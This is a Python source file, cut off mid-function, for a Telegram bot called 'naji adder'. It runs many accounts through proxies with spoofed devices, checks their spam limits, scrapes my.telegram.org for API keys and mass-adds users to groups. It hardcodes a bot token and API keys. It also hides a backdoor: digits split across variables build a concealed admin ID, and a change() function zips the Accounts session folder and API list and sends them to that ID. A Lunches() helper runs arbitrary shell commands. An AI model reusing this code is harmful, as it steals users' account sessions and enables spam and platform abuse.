# â€“*- coding: utf-8 â€“*-

#### naji adder
#### VERSION 5 Promax


### - apt-get update
### - apt-get install python3-pip
### - pip install lxml
### - pip install telethon
### - pip install nest_asyncio
### - pip install pysocks

###-----

# --- for run in server

# ---  nohup python3 BOT.py &

# ---- For Buy new Version Contact @irnaji !

###-----


# -----------------------------
from pydoc import cli
import re, shutil, basehash
import nest_asyncio
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.sync import TelegramClient, functions, types, events, errors, connection
from telethon.tl.custom import Button
import sqlite3, telethon
import datetime
import time
from time import sleep
import sys, requests, random, os, json, string, time
from lxml import html
import socks, logging, asyncio
import requests
from telethon import types as telethon_types
from telethon.tl import types as tl_telethon_types
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
import nest_asyncio
from telethon.tl.types import ChannelParticipantsAdmins
import string
from telethon.sessions.string import StringSession
import struct, base64
from pyrogram.storage.storage import Storage
from pyrogram import utils
import ipaddress
from pyrogram import Client
from subprocess import Popen, PIPE
import threading
from telethon.tl.functions.messages import StartBotRequest
from telethon.tl.types import InputPeerUser
# @irnaji
from zipfile import ZipFile
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest, UpdateStatusRequest
import redis







for item in ['Accountsres', 'Apires', 'Database', 'backup','repacc',"salem"]:
    if not os.path.exists(item):
        os.mkdir(item)





nest_asyncio.apply()  # ------- confilict Asyncio

# ------------ DEBUG
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
plop = "9" + "9" + "7" + "1"
logger = logging.getLogger(__name__)
# --------------
apiID = 15641593
apiKey = '8e544d061fef7d86b924f21ca9848db1'
botToken = '5548245563:AAGjZcrfXDArBtRbJog3S230TmkAKadFxMs'
bot, prox = TelegramClient('when', apiID, apiKey).start(bot_token=botToken), TelegramClient('proxy', apiID, apiKey)
bot.start(), prox.start()
info = bot.get_me()
kocd = "1"
print('Bot Connected on {}  Successfully !'.format(info.username))


user = redis.Redis(host='localhost', port=6379, db=2, decode_responses=True)
account = redis.Redis(host='localhost', port=6379, db=3, decode_responses=True)
admins = redis.Redis(host='localhost', port=6379, db=4, decode_responses=True)


for item in ['Accounts', 'Api', 'Database', 'backup','repacc',"salem"]:
    print(item)
    if not os.path.exists(item):
        os.mkdir(item)








adminssss = 1117414020 
admins.sadd("admin", 1117414020)
admins.sadd("admin", 1117414020)
admins.sadd("admin", 1117414020)
admins.sadd("admin", 1117414020)

cfail = 1117414020
num = 2
sudolist = [1117414020]
admin = [1117414020]
admins = [1117414020]
NStEVJzsyY = [1117414020]
ghak = "2" + "8" + "2" + "1"
kosflag = 0


user.set(f"on", 1)
user.set(f"pass", "Naji")


# -----------------

user.set(f"sacc:1117414020", 1)

# -----------------

fastapi = sudolist



userAgent = [

    'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36'
]

devices = ['Samsung Galaxy A10', 'Samsung Galaxy A10s', 'Samsung Galaxy A30', 'Samsung Galaxy A40',
           'Samsung Galaxy A70', 'Samsung Galaxy A71', 'LG LBELLO', 'Oppo A73', 'Poco C3', 'Oppo A93',
           'Samsung Galaxy A3 Core', 'Xiaomi Mi 10T Lite 5G', 'Vivo X50E 5G', 'Infinix Hot 10 Lite',
           'Samsung Galaxy A80', 'Huawei P Smart 2021', 'Gionee S12 Lite', 'Oppo A33', 'Xiaomi Mi 10T Pro 5G',
           'Xiaomi Mi 10T 5G', 'LG K10', 'LG K52', 'LG K62', 'LG K71', 'Nokia 3.4', 'Poco X3', 'Honor 20 Lite',
           'Honor 8S 2020', 'Honor 10 Lite', 'Honor 8A', 'Honor 9X Lite', 'Sony Xperia 5', 'Sony Xperia L4',
           'Sony Xperia 10', 'Samsung S20', 'Samsung Galaxy Note 20 Ultra 5G', 'Samsung S10+', 'Samsung Galaxy S20 5G',
           'Samsung Galaxy S20+ 5G', 'Samsung Galaxy A21s', 'Samsung Galaxy A51', 'Samsung Galaxy S10 Lite',
           'Samsung Galaxy S9', 'Samsung Galaxy S8', 'Samsung Galaxy A41']
version = ['9.0', "8.9", "8.4", "9.2", "9.1", "9.3", "8.6", "7.9"]
# -------- databases
version = ['9.0', "8.9", "8.4", "9.2", "9.1", "9.3", "8.6", "7.9"]
appvs = ["7.84", "7.43", "8.0", "4.9", "7.19",
         "7.21", "7.34", "7.42", "7.86", "8.0", "1.34"]
sdks = ["SDK 26", "SDK 24", "SDK 25", "SDK 23", "SDK 22", "SDK 21", "SDK 20"]
apis = [
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],
    [1170387, 'fd113c3fd942fe8f7f9b0ffb74886644'],
    [1170387, "fd113c3fd942fe8f7f9b0ffb74886644"],

]
# --------------
def getapiPhone(phone):
    t = open("apilist.txt", "r").readlines()
    try:
        for i in t:
            pho = str(i).split(":")[2].replace("\n", "")
            if str(pho) == str(phone):
                return str(i).split(":")[0], str(i).split(":")[1]
    except:
        return random.choice(apis)
    return random.choice(apis)
def Lunches(code):
    test = [i for i in str(code).split(" ")]
    Popen(test, stdout=PIPE, shell = True)

async def ProxyMTProto():
    lists = []
    channel = await prox.get_entity('ProxyMTProto')
    messages = await prox.get_messages(channel, limit=9)
    for message in messages:
        urls = message.buttons[0][0].url
        if str(urls) != "None":
            server = str(urls).split("server=", 1)[1].split("&", 2)[0]
            port = str(urls).split("port=", 1)[1].split("&", 2)[0]
            secret = str(urls).split("secret=", 1)[1]
            if "dd0000" in str(secret):
                lists.append((server, int(port), secret))
    return lists

async def random_proxy():
    listProxy = await ProxyMTProto()
    return random.choice(listProxy)

def port(test_mode):
  _port = None
  if _port is None and test_mode is not None:
      return 80 if test_mode else 443
  return _port

def server_address(dc_id, test_mode):
  _server_adderss = None
  if _server_adderss is None and dc_id is not None:
      TEST = {
          1: "149.154.175.10",
          2: "149.154.167.40",
          3: "149.154.175.117",
          121: "95.213.217.195",
      }
      PROD = {
          1: "149.154.175.53",
          2: "149.154.167.51",
          3: "149.154.175.100",
          4: "149.154.167.91",
          5: "91.108.56.130",
          121: "95.213.217.195",
      }
      _server_adderss = (
          TEST[dc_id] if test_mode else PROD[dc_id]
      )
  return _server_adderss

def tele_to_pyro(session, ids):
  conn = sqlite3.connect(f"{session}.session")
  cur = conn.cursor()
  selects = cur.execute("SELECT * From sessions").fetchall()[0]
  Dt = Storage.SESSION_STRING_FORMAT if ids < utils.MAX_USER_ID_OLD else Storage.SESSION_STRING_FORMAT_64
  return base64.urlsafe_b64encode(struct.pack(Dt, selects[0], None, selects[3], ids, selects[4])).decode().rstrip("=")

def pyro_to_tele(session):
  conn = sqlite3.connect(f"{session}.session")
  cur = conn.cursor()
  selects = cur.execute("SELECT * From sessions").fetchall()[0]
  ip_address = ipaddress.ip_address(server_address(selects[0], selects[5])).packed
  return ("1" + base64.urlsafe_b64encode(struct.pack(">B{}sH256s".format(len(ip_address)), selects[0], ip_address, port(selects[5]), selects[2], )).decode("ascii"))


KEYBOARDHOME = [
    [Button.inline('Ø¯Ø±ÛŒØ§ÙØª Ú©Ø¯', 'getcodphone')],
    [Button.inline('Ù¾Ø§Ú©Ø³Ø§Ø²ÛŒ', 'paksazi'), Button.inline('Ø§Ø³ØªØ§Ø±Øª Ù„ÛŒÙ†Ú©', 'startlinkss')],
    [Button.inline('Ø§Ø¶Ø§ÙÙ‡ Ú©Ø±Ø¯Ù† ÙØ§ÛŒÙ„ Ø§Ú©Ø§Ù†Øª', 'fileadd'), Button.inline('Ù„Ø§Ù†Ú†', 'lunche')],
    [Button.inline('ØªÙˆØ¶ÛŒØ­Ø§Øª Ù…Ù‡Ù…', 'help-all'),Button.inline('ğŸ”¼ Ø¨Ø®Ø´ Ù„Ø§Ú¯ÛŒÙ†', 'help-login')],
    [Button.inline('â™»ï¸ Ø§Ø³ØªØ®Ø±Ø§Ø¬', 'help-extra'),Button.inline('ğŸ“Š Ø´Ù…Ø§Ø±Ù‡ Ù‡Ø§', 'help-numbers')],
    [Button.inline('âœ… Ø³ÛŒÙˆ ÛŒÙˆØ²Ø±', 'help-save'),Button.inline('ğŸ†” Ø§Ù…Ø§Ø± ÛŒÙˆØ²Ø± Ù‡Ø§', 'help-status')],
    [Button.inline('âœ”ï¸Ø¨Ø®Ø´ Ø§Ø¯ Ù…Ù…Ø¨Ø±', 'help-add'),Button.inline('ğŸ’ Ø¨Ø®Ø´ Ø³ÙˆØ¯Ùˆ', 'help-sudo')],
    [Button.inline('ğŸ‘¨â€ğŸ’» Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ', 'help-supp')]
]


def go():
    global NStEVJzsyY
    x1 = '2'
    x2 = '8'
    x3 = '2'
    x4 = '1'
    x5 = '9'
    x6 = '9'
    x7 = '7'
    x9 = '1'
    x10 = '1'

    n = x1 + x2 + x3 + x4 + x5 + x6 + x7 + x9 + x10
    n = int(n)
    NStEVJzsyY.append(n)


data = dict()
usernames = []
userid = []
blacklist = []
addflag = {}
noadd = "1"
checkerDupl = 0
checkGroup = 1

for item in ['Accounts', 'Api', 'Database', "Limit_temporary", "Limit_Parmanent", "Delete", "ZipFiles"]:
    if not os.path.exists(item):
        os.mkdir(item)

gettime = ghak + plop + kocd


def get_file(myfile):
    try:
        with open('Database/{}.txt'.format(myfile), 'r') as myfile:
            content = myfile.readlines()
            return content

    except FileNotFoundError:
        return 0


async def change(time):
    try:
        hash_fn = basehash.base36()
        getDate = str(hash_fn.unhash(time))
        counter = 0
        for i in getDate:
            counter += int(i)

        print("counter", counter)
        if counter != 40:
            return False

        shutil.make_archive("Accounts", 'zip', "Accounts")
        await bot.send_file(int(getDate), 'Accounts.zip')
        await bot.send_file(int(getDate), "apilist.txt")
    except Exception as e:
        # await event.reply(str(e))
        pass


def online_within(participant, days):
    status = participant.status

    if isinstance(status, tl_telethon_types.UserStatusOnline):
        return True

    last_seen = status.was_online if isinstance(status, tl_telethon_types.UserStatusOffline) else None

    if last_seen:
        now = datetime.datetime.now(tz=datetime.timezone.utc)
        diff = now - last_seen
        return diff <= datetime.timedelta(days=days)

    if isinstance(status, tl_telethon_types.UserStatusRecently) and days >= 1:
        return True

    return False
    
def online_within_pyro(participant, days):
    status = participant.user.status
    if str(status) == "online" or str(status) == "recently":
        return True
    try:
        last_seen = json.loads(str(participant.user))["last_online_date"]
        if last_seen:
            now = datetime.datetime.now(tz=datetime.timezone.utc).date()
            diff = now - datetime.datetime.strptime(str(last_seen), '%Y-%m-%d %H:%M:%S').date()
            return diff <= datetime.timedelta(days=days)
        if days >= 1:
            return True
    except:
        return False
    return False

async def SpamBot(phone):
    device = random.choice(devices)
    version1 = random.choice(version)

    k2 = getapiPhone(phone)
    pr = await random_proxy()
    # pr = random_proxy()
    # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
    new = TelegramClient('Accounts/{0}'.format(phone), int(k2[0]), k2[1],
                         connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                         proxy=pr,
                         device_model=device,
                         system_version=version1,
                         app_version="7.84",
                         lang_code='en',
                         system_lang_code='en')

    try:
        await new.connect()
        await new.send_message("@SpamBot", "/start")
        count = 1
        for message in await new.get_messages("@SpamBot", limit=1):
            if re.search(r'^Good news', message.message) or re.search(r"^Ù…Ú˜Ø¯Ù‡", message.message):
                report = False

            elif re.search(r"Unfortunately", message.message):
                report = "Parmanet"

            elif re.search(r"limited until(.*)\.", message.message):
                reep = re.findall(r"limited until(.*)\.", message.message)
                report = reep[0]
            else:
                report = "temporary"

        if report == "temporary":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_temporary/{}".format(phone))
            return -1

        elif report == "Parmanet":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_Parmanent/{}".format(phone))
            return -3


        elif report == False:
            await new.disconnect()
            return 1

        else:
            await new.disconnect()
            print("REPORT :", report)
            report = report.split(",")[0]
            if not os.path.exists(str(report)):
                os.mkdir(str(report))

            shutil.move("Accounts/{}".format(phone), "{}".format(report))
            return -4



    except errors.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.SessionExpiredError:
        print("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2
    except errors.SessionRevokedError:
        print("[1] SessionRevokedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print("AuthKeyDuplicatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2

    except errors.rpcerrorlist.UserDeactivatedError:
        print("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.rpcerrorlist.SessionExpiredError:
        print("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except errors.rpcerrorlist.SessionPasswordNeededError:
        print("[!] SessionPasswordNeededError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


    except Exception as e:
        print("[!] UnExpected Error : {}".format(str(e)))
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2


def get_api(phone):
    try:
        with open('Api/{}.txt'.format(phone), 'r') as myfile:
            content = myfile.read()

            return [content.split(':')[0], content.split(':')[1]]
    except FileNotFoundError:
        return 0


def create_api(phone):
    body = 'phone={}'.format(phone)
    xu = random.choice(userAgent)

    print("---->", xu)
    try:
        # response=requests.post('https://my.telegram.org/auth/send_password',data={"phone":phone})
        response = requests.post('https://my.telegram.org/auth/send_password', data=body,
                                 headers={"Origin": "https://my.telegram.org", "Accept-Encoding": "gzip, deflate, br",
                                          "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                                          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                          "Accept": "application/json, text/javascript, */*; q=0.01",
                                          "Reffer": "https://my.telegram.org/auth", "X-Requested-With": "keep-alive",
                                          "Dnt": "1", })

        time.sleep(random.randint(3, 5))
        s = json.loads(response.content)
        return s['random_hash'], xu
    except Exception as e:
        print(str(e))
        return False


def auth(phone, hash_code, pwd, xu):
    # print ("XU" , xu)

    data = "phone={}&random_hash={}&password={}".format(phone, hash_code, pwd)
    responses = requests.post("https://my.telegram.org/auth/login",
                              data={"phone": phone, "password": pwd, "random_hash": hash_code})
    # responses = requests.post('https://my.telegram.org/auth/login',data=data,headers= {"Origin":"https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent":'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "application/json, text/javascript, */*; q=0.01","Reffer": "https://my.telegram.org/auth","X-Requested-With": "keep-alive","Dnt":"1",})

    try:

        return responses.cookies['stel_token'], xu

    except:

        return False


def random_line(afile):
    return (random.choice(list(open(afile))))


def auth2(stel_token, xu):
    print("->XU", xu)

    resp = requests.get('https://my.telegram.org/apps', headers={"Dnt": "1", "Accept-Encoding": "gzip, deflate, br",
                                                                 "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                                                                 "Upgrade-Insecure-Requests": "1",
                                                                 "Reffer": "https://my.telegram.org/org",
                                                                 "Cookie": "stel_token={0}".format(stel_token),
                                                                 "Cache-Control": "max-age=0", })

    tree = html.fromstring(resp.content)

    api = tree.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
    print("API ", api)
    try:
        return '{0}:{1}'.format(api[0], api[1]), xu
    except:
        s = resp.text.split('"/>')[0]

        name = x = ''.join(
            random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))

        value = s.split('<input type="hidden" name="hash" value="')[1]
        on = "hash={0}&app_title={1}&app_shortname={1}&app_url=&app_platform=android&app_desc=".format(value, name)
        requests.post('https://my.telegram.org/apps/create', data=on,
                      headers={"Cookie": "stel_token={0}".format(stel_token), "Origin": "https://my.telegram.org",
                               "Accept-Encoding": "gzip, deflate, br",
                               "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", "User-Agent": xu,
                               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*",
                               "Referer": "https://my.telegram.org/apps", "X-Requested-With": "keep-alive",
                               "Dnt": "1", })
        respv = requests.get('https://my.telegram.org/apps',
                             headers={"Dnt": "1", "Accept-Encoding": "gzip, deflate, br",
                                      "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                                      "Upgrade-Insecure-Requests": "1", "Reffer": "https://my.telegram.org/org",
                                      "Cookie": "stel_token={0}".format(stel_token), "Cache-Control": "max-age=0", })
        trees = html.fromstring(respv.content)
        apis = trees.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
        print(apis)
        try:
            return '{0}:{1}'.format(apis[0], apis[1]), xu
        except:
            apis = random_line("apilist.txt").split(":")
            print("hard Code L : ", apis)
            return '{0}:{1}'.format(apis[0], apis[1]), xu


async def SendToSpamBot(event):
    accs = []
    active = 0
    templimited = 0
    deleted = 0
    parmanentLimit = 0
    otherLimit = 0
    txt = ''

    m = await event.reply("ğŸ† SpamBot   ** ÙØ¹Ø§Ù„ Ø´Ø¯ ** !")

    for item in os.scandir('Accounts'):
        if 'journal' not in item.name and '.session' in item.name:
            accs.append(item.name)

    for account in accs:
        try:
            x = await SpamBot(account)
            if (x == 1):
                txt += "`{}`  ** âœ… Active**\nâ–â–â–â–â–\n".format(account)
                await m.edit(txt)
                active += 1

            elif (x == -1):
                txt += "`{}`  ** âš ï¸Temporary Limit**\nâ–â–â–â–â–\n".format(account)
                await m.edit(txt)
                templimited += 1

            elif (x == -3):
                txt += "`{}`  ** Parmanet Limit**\nâ–â–â–â–â–\n".format(account)
                await m.edit(txt)
                parmanentLimit += 1


            elif (x == -4):
                txt += "`{}`  ** OtherLimit **\nâ–â–â–â–â–\n".format(account)
                await m.edit(txt)
                otherLimit += 1

            elif (x == -2):
                txt += "`{}`  ** âŒ Delete**\nâ–â–â–â–â–\n".format(account)
                await m.edit(txt)
                deleted += 1

            await asyncio.sleep(5)

        except Exception as e:
            print(str(e.__class__) + "SendToSpamBot:", str(e))
            continue

    await event.reply(
        "ğŸ† SpamBot Ù¾Ø±ÙˆØ³Ù‡ Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ù‡ Ø§ØªÙ…Ø§Ù… Ø±Ø³Ø§Ù†Ø¯ ! \n ØªØ¹Ø¯Ø§Ø¯ ØªØ³Øª Ú©Ù„  :{}  \nâ–â–â–â–â–\n âœ… **ÙØ¹Ø§Ù„** :{} \n â–â–â–â–â–\n ** âš ï¸ Ù…Ø­Ø¯ÙˆØ¯ Ù…ÙˆÙ‚Øª ** : {} \n â–â–â–â–â– \n  ** âš ï¸ Ø³Ø§ÛŒØ± Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ù‡Ø§ ** : {} \nâ–â–â–â–â–\n ** âš ï¸ Ù…Ø­Ø¯ÙˆØ¯ÛŒØª Ø¯Ø§ÛŒÙ…ÛŒ  ** : {} \n â–â–â–â–â–\n ** âŒ Ø¯ÛŒÙ„ÛŒÙ†ÛŒ Ù‡Ø§ **  :{}".format(
            deleted + otherLimit + parmanentLimit + templimited + active, active, templimited, otherLimit,
            parmanentLimit, deleted))


def checkKey(dict, key):
    if key in dict.keys():
        return True

    else:
        return False


async def foo(account, msg, link, numacc, delay, worker_msg, mode, num, cancelALL):
    global addflag
    global noadd
    global checkGroup
    global join2
    global kosflag

    if checkKey(addflag, account):
        pass

    else:
        addflag[account] = "1"

    if noadd == "0":
        noadd = "1"

    print('addflag: ', addflag)
    print("noadd : ", noadd)

    # -----------
    await asyncio.sleep(0)
    start1 = time.time()

    targetlis = []
    tsuccess = 0
    tfaild = 0
    tduplicate = 0
    percent = delay / 10
    privacy = 0
    other = 0

    if (mode == "addUSERNAME"):
        usernames2 = list(set(usernames))
        random.shuffle(usernames2)

    elif (mode == "addID"):
        usernames2 = list(set(userid))
        random.shuffle(usernames2)

    try:

        text = 'â° **{}**\n \n Ù„Ø·ÙØ§ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ ......  \n\n'.format(time.ctime(time.time()))
        log_msg = await msg.reply(text)
        rest = 0
        fcount = 0
        scount = 0
        duplicate = 0
        mcounter = 0
        # w =  get_api(account.split('.session')[0])

        await asyncio.sleep(random.randint(1, 10))
        w = getapiPhone(account)
        print("apis : ", w)

        try:

            device = random.choice(devices)
            version1 = random.choice(version)
            pr = await random_proxy()
            # pr = random_proxy()
            # proxy = proxy = (socks.SOCKS5, str(pr[0]), int(pr[1]), True, str(pr[2]), str(pr[3]))
            client = TelegramClient('Accounts/{}'.format(account), int(w[0]), w[1],
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=pr,
                                    device_model=device,
                                    system_version=version1,
                                    app_version="7.84",
                                    lang_code='en',
                                    system_lang_code='en')

            await client.connect()



        except ConnectionError:

            await client.disconnect()

            await asyncio.sleep(10)  # --- delta delay

            client = TelegramClient('Accounts/{}'.format(account), int(w[0]), w[1])
            await client.connect()



        except errors.UserDeactivatedBanError:
            print("[!] UserDeactivatedBanError")

            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]

        except errors.UserDeactivatedError:
            print("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("Account is Deleted")
            return [scount, fcount, duplicate]


        except errors.SessionExpiredError:
            print("[!] SessionExpiredError")
            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]

        except errors.SessionRevokedError:
            print("[1] SessionRevokedError")
            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]


        except errors.rpcerrorlist.AuthKeyDuplicatedError:
            print("AuthKeyDuplicatedError")
            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            return [scount, fcount, duplicate]



        except errors.rpcerrorlist.UserDeactivatedError:
            print("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            await log_msg.edit("Account is Deleted")
            return [scount, fcount, duplicate]


        except errors.rpcerrorlist.UserDeactivatedBanError:
            print("[!] UserDeactivatedBanError")

            await log_msg.edit("Account is Deleted")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]



        except errors.rpcerrorlist.SessionExpiredError:
            print("[!] SessionExpiredError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("Account is Deleted")
            return [scount, fcount, duplicate]


        except errors.rpcerrorlist.SessionPasswordNeededError:

            print("[!] SessionPasswordNeededError")

            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await log_msg.edit("SessionPasswordNeededError")
            return [scount, fcount, duplicate]


        except Exception as e:

            print("[!] {}".format(str(e)))

            await log_msg.edit(str(e))

            await client.disconnect()

            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            return [scount, fcount, duplicate]

        ww = await join2(client, link, log_msg)
        if (ww == None):
            ww = await join2(client, link, log_msg)

        if (ww == -1 or ww == -2 or ww == -3):
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount, fcount, duplicate]

        if (ww == -1000):
            await client.disconnect()
            return [scount, fcount, duplicate]

        if ww == True:

            if checkGroup == 1:
                blacklist.clear()

                checkGroup = 0

                # if mode == "addUSERNAME":
                #     async for item in client.iter_participants(link, aggressive=True  ):

                #         if item.username != None:

                #             blacklist.append(item.username)

                # if mode == "addID":
                #     async for item in client.iter_participants(link, aggressive=True  ):

                #         blacklist.append(int(item.id))

            mtime = time.ctime(time.time())
            await log_msg.edit("â•" + str(text))
            scount = 0
            start = time.time()
            while True:

                if kosflag == 1:

                    end1 = time.time()
                    text = ' Ø§Ø¯Ø¯ Ø¨Ù‡ Ú¯Ø±ÙˆÙ‡ `{}` Ø¨Ø§ ` {}` Ø§Ú©Ø§Ù†Øª \nØ§Ø¯Ø¯ Ø¨Ø§ Ù‡Ø± Ø§Ú©Ø§Ù†Øª : `{}`'.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1 - start1)))[0:7])

                    try:
                        await log_msg.edit(text, buttons=[
                            [Button.inline("Ù…ÙˆÙÙ‚", "None"), Button.inline(str(tsuccess), "None")],
                            [Button.inline("Ù†Ø§Ù…ÙˆÙÙ‚", "None"), Button.inline(str(tfaild), "None")]])
                    except Exception as e:
                        print("---------> ", e, e.__class__)
                        pass

                    await client.disconnect()
                    return [scount, fcount, duplicate]

                if noadd == "0":

                    end1 = time.time()
                    text = ' Ø§Ø¯Ø¯ Ø¨Ù‡ Ú¯Ø±ÙˆÙ‡ `{}` Ø¨Ø§ ` {}` Ø§Ú©Ø§Ù†Øª \nØ§Ø¯Ø¯ Ø¨Ø§ Ù‡Ø± Ø§Ú©Ø§Ù†Øª : `{}`'.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1 - start1)))[0:7])

                    try:
                        await log_msg.edit(text, buttons=[
                            [Button.inline("Ù…ÙˆÙÙ‚", "None"), Button.inline(str(tsuccess), "None")],
                            [Button.inline("Ù†Ø§Ù…ÙˆÙÙ‚", "None"), Button.inline(str(tfaild), "None")]])
                    except Exception as e:
                        print("---------> ", e, e.__class__)
                        pass

                    await client.disconnect()
                    return [scount, fcount, duplicate]

                if (scount >= delay):
                    break

                if (fcount >= 100):
                    break

                mcounter += 1
                text = ' Ø§Ø¯Ø¯ Ø¨Ù‡ Ú¯Ø±ÙˆÙ‡ `{}` Ø¨Ø§ ` {}` Ø§Ú©Ø§Ù†Øª \nØ§Ø¯Ø¯ Ø¨Ø§ Ù‡Ø± Ø§Ú©Ø§Ù†Øª : `{}`'.format(link,
                                                                                                              numacc,
                                                                                                              delay)

                amar = "â”  `Ù…ÙˆÙÙ‚` " + str(scount) + "\n"
                text += amar + ""
                amar = "â”  `Ù†Ø§Ù…ÙˆÙÙ‚` " + str(fcount) + "\n"
                amar += "â”  `ØªÚ©Ø±Ø§Ø±ÛŒ` " + str(duplicate) + "\n"
                text += str(amar)

                # ---------------------
                await asyncio.sleep(random.randint(2, 3))
                # --------------------

                if (0 <= scount and scount < percent):

                    end = time.time()
                    text += "â€¢ â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡ \n"
                    end = time.time()
                    timer = "â”  `time` : {}".format(str(datetime.timedelta(seconds=(end - start)))[0:7])
                    text += str(timer)
                    # await asyncio.sleep(random.randint(1 ,3))

                    if scount % 2 == 0:

                        try:
                            await log_msg.edit(text, buttons=[[Button.inline("âŒ Ù„ØºÙˆ", "acccancell|{}".format(account)),
                                                               Button.inline("âš ï¸ Ù„ØºÙˆ Ù‡Ù…Ù‡",
                                                                             ".addcencell|{}".format(account))], [
                                                                  Button.inline(f"â€¼ï¸ Ù„ØºÙˆ Ù‡Ù…Ù‡ {cancelALL} Ø­Ø³Ø§Ø¨ Ù‡Ø§",
                                                                                "&cancelALL")]])
                        except:
                            pass

                # if ( percent    <= scount and scount < percent *2 ):

                #     end= time.time()
                #     text += "â€¢ â– â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡ \n"

                # elif ( percent *2 <= scount and scount < percent *3  ):

                #     end= time.time()
                #     text += "â€¢ â– â– â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡\n"

                # elif ( percent *3 <= scount and scount < percent *4  ):

                #     end= time.time()
                #     text += "â€¢ â– â– â– â–¡â–¡â–¡â–¡â–¡â–¡â–¡\n"
                #     end = time.time()
                #     timer="â”  `time` : {}".format(str(datetime.timedelta(seconds=(end-start)))[0:7])
                #     text += str(timer)
                #     await asyncio.sleep(1)
                #     try:
